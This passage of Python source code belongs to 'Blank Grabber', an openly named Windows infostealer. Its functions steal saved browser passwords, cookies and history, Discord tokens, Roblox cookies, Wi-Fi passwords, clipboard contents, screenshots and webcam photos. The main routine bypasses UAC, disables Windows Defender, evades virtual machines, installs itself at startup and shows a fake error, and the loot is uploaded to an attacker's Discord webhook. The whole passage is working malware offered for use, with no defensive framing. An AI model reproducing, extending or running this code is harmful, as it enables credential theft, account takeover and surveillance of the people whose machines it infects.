            with open(os.path.join(saveToDir, "Roblox Cookies.txt"), "w") as file:
                file.write("{}{}{}".format(note, self.Separator, self.Separator.join(self.RobloxCookies)))
    
    @Errors.Catch
    def StealSystemInfo(self) -> None:
        if Settings.CaptureSystemInfo:
            saveToDir = os.path.join(self.TempFolder, "System")

            process = subprocess.run("systeminfo", capture_output= True, shell= True)
            if process.returncode == 0:
                output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
                os.makedirs(saveToDir, exist_ok= True)
                with open(os.path.join(saveToDir, "System Info.txt"), "w") as file:
                    file.write(output)
        
    @Errors.Catch
    def GetDirectoryTree(self) -> None:
        if Settings.CaptureSystemInfo:
            output = {}
            for location in ['Desktop', 'Documents' , 'Downloads', 'Music', 'Pictures', 'Videos']:
                location = os.path.join(os.getenv('userprofile'), location)
                if not os.path.isdir(location):
                    continue
                dircontent = os.listdir(location)
                if 'desltop.ini' in dircontent:
                    dircontent.remove('desktop.ini')
                if dircontent:
                    process = subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= location)
                    if process.returncode == 0:
                        output[os.path.split(location)[-1]] = os.path.basename(location) + "\n" + "\n".join(process.stdout.decode(errors= "ignore").splitlines()[3:])

            for key, value in output.items():
                os.makedirs(os.path.join(self.TempFolder, "Directories"), exist_ok= True)
                with open(os.path.join(self.TempFolder, "Directories", "{}.txt".format(key)), "w", encoding= "utf-8") as file:
                    file.write(value)
    
    @Errors.Catch
    def GetClipboard(self) -> None:
        if Settings.CaptureSystemInfo:
            saveToDir = os.path.join(self.TempFolder, "System")

            process = subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True)
            if process.returncode == 0:
                content = process.stdout.decode(errors= "ignore").strip()
                if content:
                    os.makedirs(saveToDir, exist_ok= True)
                    with open(os.path.join(saveToDir, "Clipboard.txt"), "w", encoding= "utf-8") as file:
                        file.write(content)
    
    @Errors.Catch
    def GetAntivirus(self) -> None:
        if Settings.CaptureSystemInfo:
            saveToDir = os.path.join(self.TempFolder, "System")

            process = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", shell= True, capture_output= True)
            if process.returncode == 0:
                output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n").splitlines()
                if len(output) >= 2:
                    output = output[1:]
                    os.makedirs(saveToDir, exist_ok= True)
                    with open(os.path.join(saveToDir, "Antivirus.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                        file.write("\n".join(output))
    
    @Errors.Catch
    def GetTaskList(self) -> None:
        if Settings.CaptureSystemInfo:
            saveToDir = os.path.join(self.TempFolder, "System")

            process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
            if process.returncode == 0:
                output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
                os.makedirs(saveToDir, exist_ok= True)
                with open(os.path.join(saveToDir, "Task List.txt"), "w", errors= "ignore") as tasklist:
                    tasklist.write(output)
    
    @Errors.Catch
    def GetWifiPasswords(self) -> None:
        if Settings.CaptureWifiPasswords:
            saveToDir = os.path.join(self.TempFolder, "System")
            passwords = Utility.GetWifiPasswords()
            profiles = list()
            for profile, psw in passwords.items():
                profiles.append(f"Network: {profile}\nPassword: {psw}")
            if profiles:
                os.makedirs(saveToDir, exist_ok= True)
                with open(os.path.join(saveToDir, "Wifi Networks.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(profiles))
                self.WifiPasswords.extend(profiles)
    
    @Errors.Catch
    def TakeScreenshot(self) -> None:
        if Settings.CaptureScreenshot:
            image = ImageGrab.grab(bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            image.save(os.path.join(self.TempFolder, "Screenshot.png"), "png")
            self.Screenshot += 1


    
    @Errors.Catch
    def BlockSites(self) -> None:
        if Settings.BlockAvSites:
            Utility.BlockSites()
            for process in ("chrome", "firefox", "msedge", "safari", "opera", "iexplore"):
                subprocess.Popen("taskkill /F /IM {}.exe".format(process), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
    
    @Errors.Catch
    def StealBrowserData(self) -> None:
        threads: list[Thread] = []
        paths = {
            "Brave" : os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
            "Chrome" : os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
            "Chromium" : os.path.join(os.getenv("localappdata"), "Chromium", "User Data"),
            "Comodo" : os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"),
            "Edge" : os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"),
            "EpicPrivacy" : os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"),
            "Iridium" : os.path.join(os.getenv("localappdata"), "Iridium", "User Data"),
            "Opera" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"),
            "Opera GX" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"),
            "Slimjet" : os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"),
            "UR" : os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"),
            "Vivaldi" : os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"),
            "Yandex" : os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data")
        }

        for name, path in paths.items():
            if os.path.isdir(path):
                def run(name, path):
                    try:
                        browser = Browsers.Chromium(path)
                        saveToDir = os.path.join(self.TempFolder, "Credentials", name)

                        passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                        cookies = browser.GetCookies() if Settings.CaptureCookies else None
                        history = browser.GetHistory() if Settings.CaptureHistory else None

                        if passwords or cookies or history:
                            os.makedirs(saveToDir, exist_ok= True)

                            if passwords:
                                output = ["URL: {}\nUsername: {}\nPassword: {}".format(*x) for x in passwords]
                                with open(os.path.join(saveToDir, "{} Passwords.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.Passwords.extend(passwords)
                            
                            if cookies:
                                output = ["{}\t{}\t{}\t{}\t{}\t{}\t{}".format(host, str(expiry != 0).upper(), cpath, str(not host.startswith(".")).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
                                
                                with open(os.path.join(saveToDir, "{} Cookies.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                    file.write("\n".join(output))
                                self.Cookies.extend([str(x[3]) for x in cookies])
                            
                            if history:
                                output = ["URL: {}\nTitle: {}\nVisits: {}".format(*x) for x in history]
                                with open(os.path.join(saveToDir, "{} History.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.History.extend(history)

                    except Exception as e:
                        return

                t = Thread(target= run, args= (name, path))
                t.start()
                threads.append(t)
        
        for thread in threads:
            thread.join()
        
        if Settings.CaptureRobloxCookies:
            self.StealRobloxCookies()

    @Errors.Catch
    def Webshot(self) -> None:
        isExecutable = Utility.GetSelf()[1]
        MEIPASS = getattr(sys, "_MEIPASS") if isExecutable else os.path.dirname(__file__)
        if not Settings.CaptureWebcam or not os.path.isfile(Camfile := os.path.join(MEIPASS, 'Camera')):
            return
        
        def isMonochrome(path: str):
            return __import__("functools").reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)

        with open(Camfile, 'rb') as file:
            data = file.read()
        data = pyaes.AESModeOfOperationCTR(b'f61QfygejoxUWGxI').decrypt(data)
        if not b'This program cannot be run in DOS mode.' in data:
            return
        if isExecutable:
            tempCam = os.path.join(MEIPASS, 'Camera.exe')
        else:
            tempCam = os.path.join(os.getenv('temp'), 'Camera.exe')
        with open(tempCam, 'wb') as file:
            file.write(data)
        tempCamPath = os.path.dirname(tempCam)
        camlist = [x[15:] for x in subprocess.run('Camera.exe /devlist', capture_output= True, shell= True, cwd= tempCamPath).stdout.decode(errors= 'ignore').splitlines() if "Device name:" in x]
        for index, name in enumerate(camlist):
            try:
                subprocess.run('Camera.exe /devnum {} /quiet /filename image.bmp'.format(index + 1), shell= True, stdout= open(os.devnull, 'w'), stderr= open(os.devnull, 'w'), cwd= tempCamPath, timeout= 5.0)
            except subprocess.TimeoutExpired:
                continue
            if not os.path.isfile(tempImg := os.path.join(tempCamPath, 'image.bmp')):
                continue
            if isMonochrome(tempImg):
                os.remove(tempImg)
                continue
            os.makedirs(webcamFolder := os.path.join(self.TempFolder, 'Webcam'), exist_ok= True)
            with Image.open(tempImg) as img:
                img.save(os.path.join(webcamFolder, '{}.png'.format(name)), 'png')
            os.remove(tempImg)
            self.WebcamPictures += 1
        os.remove(tempCam)
    
    @Errors.Catch
    def StealDiscordTokens(self) -> None:
        if Settings.CaptureDiscordTokens:
            output = list()
            saveToDir = os.path.join(self.TempFolder, "Messenger", "Discord")
            accounts = Discord.GetTokens()
            if accounts:
                for item in accounts:
                    USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = item.values()
                    output.append("Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}".format(USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip())
                
                os.makedirs(os.path.join(self.TempFolder, "Messenger", "Discord"), exist_ok= True)
                with open(os.path.join(saveToDir, "Discord Tokens.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                self.DiscordTokens.extend(accounts)
        
        if Settings.DiscordInjection and not Utility.IsInStartup():
            paths = Discord.InjectJs()
            if paths is not None:
                for dir in paths:
                    appname = os.path.basename(dir)
                    killTask = subprocess.run('taskkill /F /IM {}.exe'.format(appname), shell= True, capture_output= True)
                    if killTask.returncode == 0:
                        for root, _, files in os.walk(dir):
                            for file in files:
                                if file.lower() == appname.lower() + '.exe':
                                    time.sleep(3)
                                    filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
                                    UpdateEXE = os.path.join(dir, 'Update.exe')
                                    DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
                                    subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
    
    def SendData(self) -> None:
        if (self.Cookies or self.Passwords or self.RobloxCookies or self.DiscordTokens or self.MinecraftFiles) and os.path.isfile(self.ArchivePath):
            computerName = os.getenv("computername")
            computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
            totalMemory = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1])/1000000000)) + " GB"
            uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
            cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
            gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
            productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()

            http = PoolManager()

            try:
                r = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
                if r.get("status") != "success":
                    raise Exception("Failed")
                data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
                if len(r["reverse"]) != 0:
                    data += f"\nReverse DNS: {r['reverse']}"
            except Exception:
                ipinfo = "(Unable to get IP info)"
            else:
                ipinfo = data

            collection = {
                            "Discord Accounts" : len(self.DiscordTokens),
                            "Passwords" : len(self.Passwords),
                            "Cookies" : len(self.Cookies),
                            "History" : len(self.History),
                            "Roblox Cookies" : len(self.RobloxCookies),
                            "Wifi Passwords" : len(self.WifiPasswords),
                            "Minecraft Sessions" : self.MinecraftSessions,
                            "Screenshot" : self.Screenshot,
                            "Webcam" : self.WebcamPictures
            }
            
            grabbedInfo = "\n".join([key.ljust(20) + " : " + str(value) for key, value in collection.items()])

            payload = {
  "content": "@everyone" if Settings.PingMe else "",
  "embeds": [
    {
      "title": "Blank Grabber",
      "description": f"**__System Info__\n```autohotkey\nComputer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
      "url": "https://github.com/Blank-c/Blank-Grabber",
      "color": 34303,
      "footer": {
        "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
      },
      "thumbnail": {
        "url": "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
      }
    }
  ]
}
            
            with open(self.ArchivePath, "rb") as file:
                fileBytes = file.read()
            
            http.request("POST", Settings.Webhook, body= json.dumps(payload).encode(), headers= Discord.GetHeaders())
            http.request("POST", Settings.Webhook, fields= {"file" : ("Blank-{}.zip".format(os.getlogin()), fileBytes)})


if __name__ == "__main__" and os.name == "nt":

    if not Utility.IsAdmin() and Utility.GetSelf()[1] and not "--nouacbypass" in sys.argv:
        Utility.UACbypass()
    
    Utility.ExcludeFromDefender()
    Utility.DisableDefender()

    if not Utility.IsInStartup() and Utility.GetSelf()[1] and os.path.isfile(os.path.join(sys._MEIPASS, "bound.exe")):
        try:
            if os.path.isfile(boundfile:= os.path.join(os.getenv("temp"), "bound.exe")):
                os.remove(boundfile)
            shutil.copy(os.path.isfile(sys._MEIPASS, "bound.exe"), boundfile)
            Thread(target= os.startfile, args= (boundfile,), daemon= True).start()
        except Exception:
            pass
    
    if Settings.FakeError[0] and not Utility.IsInStartup():
        try:
            title = Settings.FakeError[1][0].replace("\x22", "\\x22").replace("\x27", "\\x22")
            message = Settings.FakeError[1][1].replace("\x22", "\\x22").replace("\x27", "\\x22")
            icon = int(Settings.FakeError[1][2])
            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, Settings.FakeError[1][2])
            subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception:
            pass
    
    if Settings.Vmprotect and VmProtect.isVM():
        os._exit(1)
    
    if Settings.Melt and not Utility.IsInStartup():
        Utility.HideSelf()
    
    try:
        if Settings.Startup and not Utility.IsInStartup():
            path = Utility.PutInStartup()
            if path is not None:
                Utility.ExcludeFromDefender(path)
    except Exception:
        pass
    
    while True:
        try:
            if Utility.IsConnectedToInternet():
                BlankGrabber()
                break
        except Exception as e:
            print(e)
            time.sleep(1500)
    
    if Settings.Melt and not Utility.IsInStartup():
        Utility.DeleteSelf()